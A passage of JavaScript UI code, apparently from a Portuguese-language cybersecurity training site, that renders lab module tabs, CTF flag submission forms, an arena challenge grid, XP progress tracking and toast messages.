                if (dc && _labActiveModule) dc.scrollIntoView({ behavior: 'smooth', block: 'start' });
            }, 80);
        }

        function labShowDetail(moduleId) {
            const mod = LAB_MODULES.find(m => m.id === moduleId);
            if (!mod) return;
            const dc = document.getElementById('lab-detail-container');
            if (!dc) return;

            const tabs = mod.isArena
                ? [['teoria', '📖 Teoria'], ['arena', '🏴 Arena CTF']]
                : mod.ctfFlag
                    ? [['teoria', '📖 Teoria'], ['labs', '🧪 Labs'], ['ctf', '🎯 CTF']]
                    : [['teoria', '📖 Teoria'], ['labs', '🧪 Labs']];

            dc.innerHTML = `
<div class="lab-detail" id="lab-detail-box">
  <div class="lab-detail-header">
    <div class="lab-detail-title">
      <span class="lab-detail-icon">${mod.icon}</span>
      <span class="lab-detail-name">Módulo ${mod.num} — ${mod.name}</span>
    </div>
    <button class="lab-detail-close" onclick="labCloseDetail()">✕</button>
  </div>
  <div class="lab-tabs">
    ${tabs.map(([id, label]) => `<button class="lab-tab${_labActiveTab === id ? ' active' : ''}" onclick="labSwitchTab('${id}')">${label}</button>`).join('')}
  </div>
  <div class="lab-tab-panel${_labActiveTab === 'teoria' ? ' active' : ''}" id="lab-panel-teoria">
    ${labRenderTheory(mod)}
  </div>
  ${!mod.isArena ? `
  <div class="lab-tab-panel${_labActiveTab === 'labs' ? ' active' : ''}" id="lab-panel-labs">
    ${labRenderLabs(mod)}
  </div>` : ''}
  ${mod.ctfFlag ? `
  <div class="lab-tab-panel${_labActiveTab === 'ctf' ? ' active' : ''}" id="lab-panel-ctf">
    ${labRenderCTF(mod)}
  </div>` : ''}
  ${mod.isArena ? `
  <div class="lab-tab-panel${_labActiveTab === 'arena' ? ' active' : ''}" id="lab-panel-arena">
    ${labRenderArena(mod)}
  </div>` : ''}
</div>
            `;
        }

        function labCloseDetail() {
            _labActiveModule = null;
            labRender();
        }

        function labSwitchTab(tabId) {
            _labActiveTab = tabId;
            document.querySelectorAll('.lab-tab').forEach(t => t.classList.toggle('active', t.textContent.toLowerCase().includes(tabId) || t.onclick.toString().includes(`'${tabId}'`)));
            document.querySelectorAll('.lab-tab-panel').forEach(p => p.classList.remove('active'));
            const panel = document.getElementById(`lab-panel-${tabId}`);
            if (panel) panel.classList.add('active');
        }

        function labRenderTheory(mod) {
            return `
<div class="lab-theory-grid">
  <div class="lab-theory-card">
    <div class="lab-theory-card-title">Conceitos Chave</div>
    <ul class="lab-theory-list">
      ${mod.theory.concepts.map(c => `<li>${c}</li>`).join('')}
    </ul>
  </div>
  <div class="lab-theory-card">
    <div class="lab-theory-card-title">Ferramentas do Módulo</div>
    <div class="lab-tools-grid">
      ${mod.tools.map(t => `<span class="lab-tool-pill">🔧 ${t}</span>`).join('')}
    </div>
    <div class="lab-theory-card-title" style="margin-top:1rem;">Recursos</div>
    <ul class="lab-theory-list">
      ${mod.theory.resources.map(r => `<li>${r}</li>`).join('')}
    </ul>
  </div>
</div>
            `;
        }

        function labRenderLabs(mod) {
            const p = labGetModuleProgress(mod.id);
            return `
<div class="lab-steps-list">
  ${mod.steps.map((step, i) => {
    const done = p.steps && p.steps[i];
    return `
<div class="lab-step${done ? ' done' : ''}" onclick="labToggleStep('${mod.id}', ${i})">
  <div class="lab-step-check">${done ? '✓' : ''}</div>
  <div class="lab-step-body">
    <div class="lab-step-title">${i + 1}. ${step.title}</div>
    <div class="lab-step-desc">${step.desc}</div>
    ${step.cmd ? `<div class="lab-step-cmd">${escapeHtml(step.cmd)}</div>` : ''}
  </div>
  <div class="lab-step-xp">+${step.xp} XP</div>
</div>
    `;
  }).join('')}
</div>
            `;
        }

        function labRenderCTF(mod) {
            const p = labGetModuleProgress(mod.id);
            if (p.ctfSolved) {
                return `
<div class="lab-ctf-card">
  <div class="lab-ctf-solved-banner">
    <span class="lab-ctf-solved-icon">🏆</span>
    <div>
      <div style="font-weight:700;">Challenge concluído!</div>
      <div style="font-size:0.78rem;opacity:0.8;margin-top:0.2rem;">${mod.ctfTitle} — +100 XP</div>
    </div>
  </div>
</div>
                `;
            }
            return `
<div class="lab-ctf-card">
  <div class="lab-ctf-title">🎯 ${mod.ctfTitle}</div>
  <div class="lab-ctf-desc">${mod.ctfDesc}</div>
  <div class="lab-ctf-objective">${mod.ctfObjective}</div>
  <div class="lab-ctf-flag-row">
    <input class="lab-ctf-input" id="ctf-input-${mod.id}" type="text" placeholder="flag{...}" spellcheck="false"
           onkeydown="if(event.key==='Enter')labSubmitFlag('${mod.id}')">
    <button class="lab-ctf-submit" onclick="labSubmitFlag('${mod.id}')">Submeter Flag</button>
  </div>
  <div class="lab-ctf-result" id="ctf-result-${mod.id}"></div>
  <button class="lab-hint-btn" onclick="labToggleHint('${mod.id}')">💡 Pedir Hint (−25 XP)</button>
  <div class="lab-hint-text" id="ctf-hint-${mod.id}">${mod.ctfHint}</div>
</div>
            `;
        }

        function labRenderArena(mod) {
            const p = labGetModuleProgress(mod.id);
            return `
<div style="margin-bottom:1rem;font-size:0.8rem;color:var(--text-secondary);">
  Desafios independentes. Cada flag resolvida conta para o teu XP e posição no leaderboard da turma.
</div>
<div class="ctf-arena-grid">
  ${mod.arenaChalls.map(c => {
    const solved = p.ctfArena && p.ctfArena[c.id];
    return `
<div class="ctf-arena-card difficulty-${c.diff}${solved ? ' solved' : ''}">
  <div class="ctf-arena-card-title">${solved ? '✓ ' : ''}${c.title}</div>
  <div class="ctf-arena-card-type">${c.type}</div>
  <div style="font-size:0.75rem;color:var(--text-secondary);margin-bottom:0.75rem;">${c.desc}</div>
  ${!solved ? `
  <input class="lab-ctf-input" id="arena-input-${c.id}" type="text" placeholder="flag{...}"
         onkeydown="if(event.key==='Enter')labSubmitArena('${mod.id}','${c.id}','${c.flag}',${c.xp})"
         style="margin-bottom:0.5rem;font-size:0.75rem;">
  <div class="ctf-arena-card-meta">
    <span class="ctf-arena-diff ${c.diff}">${c.diff.toUpperCase()}</span>
    <span class="ctf-arena-xp">+${c.xp} XP</span>
  </div>
  <div class="lab-ctf-result" id="arena-result-${c.id}"></div>
  ` : `<div class="ctf-arena-card-meta"><span class="ctf-arena-diff ${c.diff}">${c.diff.toUpperCase()}</span><span class="ctf-arena-xp" style="color:var(--success-color);">✓ +${c.xp} XP</span></div>`}
</div>
    `;
  }).join('')}
</div>
            `;
        }

        // ── Actions ───────────────────────────────────────────────────────
        function labToggleStep(moduleId, stepIdx) {
            labLoadProgress();
            if (!_labProgress[moduleId]) _labProgress[moduleId] = { steps: {}, ctfSolved: false, ctfArena: {} };
            const wasOff = !_labProgress[moduleId].steps[stepIdx];
            _labProgress[moduleId].steps[stepIdx] = wasOff;
            if (!wasOff) delete _labProgress[moduleId].steps[stepIdx];
            labSaveProgress();
            const mod = LAB_MODULES.find(m => m.id === moduleId);
            if (wasOff && mod) labToast(`+${mod.steps[stepIdx].xp} XP — "${mod.steps[stepIdx].title}" concluído!`, 'xp');
            const detail = document.getElementById('lab-detail-box');
            if (detail) {
                const labsPanel = document.getElementById('lab-panel-labs');
                if (labsPanel) labsPanel.innerHTML = labRenderLabs(mod);
            }
            labRefreshModuleCard(moduleId);
            labRefreshStats();
        }

        function labSubmitFlag(moduleId) {
            const input = document.getElementById(`ctf-input-${moduleId}`);
            const result = document.getElementById(`ctf-result-${moduleId}`);
            if (!input || !result) return;
            const mod = LAB_MODULES.find(m => m.id === moduleId);
            if (!mod) return;
            const val = input.value.trim();
            if (val === mod.ctfFlag) {
                labLoadProgress();
                if (!_labProgress[moduleId]) _labProgress[moduleId] = { steps: {}, ctfSolved: false, ctfArena: {} };
                _labProgress[moduleId].ctfSolved = true;
                labSaveProgress();
                labToast(`🏆 Flag correcta! +100 XP`, 'xp');
                const ctfPanel = document.getElementById('lab-panel-ctf');
                if (ctfPanel) ctfPanel.innerHTML = labRenderCTF(mod);
                labRefreshModuleCard(moduleId);
                labRefreshStats();
            } else {
                result.className = 'lab-ctf-result wrong';
                result.textContent = 'Flag incorrecta. Continua a tentar!';
                input.style.borderColor = 'rgba(248,81,73,0.5)';
                setTimeout(() => { input.style.borderColor = ''; result.className = 'lab-ctf-result'; }, 2000);
            }
        }

        function labSubmitArena(moduleId, challId, correctFlag, xp) {
            const input = document.getElementById(`arena-input-${challId}`);
            const result = document.getElementById(`arena-result-${challId}`);
            if (!input) return;
            const val = input.value.trim();
            if (val === correctFlag) {
                labLoadProgress();
                if (!_labProgress[moduleId]) _labProgress[moduleId] = { steps: {}, ctfSolved: false, ctfArena: {} };
                if (!_labProgress[moduleId].ctfArena) _labProgress[moduleId].ctfArena = {};
                _labProgress[moduleId].ctfArena[challId] = true;
                labSaveProgress();
                labToast(`🏴 Flag correcta! +${xp} XP`, 'xp');
                const mod = LAB_MODULES.find(m => m.id === moduleId);
                const arenaPanel = document.getElementById('lab-panel-arena');
                if (arenaPanel && mod) arenaPanel.innerHTML = labRenderArena(mod);
                labRefreshModuleCard(moduleId);
                labRefreshStats();
            } else {
                if (result) {
                    result.className = 'lab-ctf-result wrong';
                    result.textContent = 'Incorrecta.';
                    setTimeout(() => { result.className = 'lab-ctf-result'; }, 1500);
                }
            }
        }

        function labToggleHint(moduleId) {
            const hint = document.getElementById(`ctf-hint-${moduleId}`);
            if (!hint) return;
            const showing = hint.style.display === 'block';
            hint.style.display = showing ? 'none' : 'block';
        }

        function labRefreshModuleCard(moduleId) {
            const cards = document.querySelectorAll('.lab-module-card');
            LAB_MODULES.forEach((mod, idx) => {
                if (mod.id === moduleId && cards[idx]) {
                    cards[idx].outerHTML = labRenderModuleCard(mod, idx);
                }
            });
            const grid = document.querySelector('.lab-modules-grid');
            if (grid) {
                grid.innerHTML = LAB_MODULES.map((mod, idx) => labRenderModuleCard(mod, idx)).join('');
            }
        }

        function labRefreshStats() {
            const totalXP = labTotalXP();
            const maxXP = labMaxXP();
            const xpPct = maxXP > 0 ? Math.round((totalXP / maxXP) * 100) : 0;
            const completedMods = LAB_MODULES.filter(m => labCalcModulePct(m) === 100).length;
            const ctfsSolved = LAB_MODULES.reduce((acc, m) => {
                const p = labGetModuleProgress(m.id);
                return acc + (p.ctfSolved ? 1 : 0);
            }, 0);
            const xpVal = document.querySelector('.lab-xp-value');
            if (xpVal) xpVal.innerHTML = `${totalXP} <span style="font-size:0.9rem;opacity:0.6">/ ${maxXP}</span>`;
            const xpFill = document.querySelector('.lab-xp-progress-fill');
            if (xpFill) xpFill.style.width = xpPct + '%';
            const statVals = document.querySelectorAll('.lab-stat-value');
            if (statVals[0]) statVals[0].textContent = completedMods;
            if (statVals[1]) statVals[1].textContent = ctfsSolved;
            if (statVals[2]) statVals[2].textContent = totalXP;
            if (statVals[3]) statVals[3].textContent = xpPct + '%';
        }

        // ── Toast ─────────────────────────────────────────────────────────
        let _labToastTimer = null;
        function labToast(msg, type = 'xp') {
            let t = document.getElementById('lab-toast');
            if (!t) {
                t = document.createElement('div');
                t.id = 'lab-toast';
                t.className = 'lab-toast';
                document.body.appendChild(t);
            }
            t.textContent = msg;
            t.className = `lab-toast ${type}`;
            requestAnimationFrame(() => { t.classList.add('show'); });
            clearTimeout(_labToastTimer);
            _labToastTimer = setTimeout(() => { t.classList.remove('show'); }, 3000);
        }
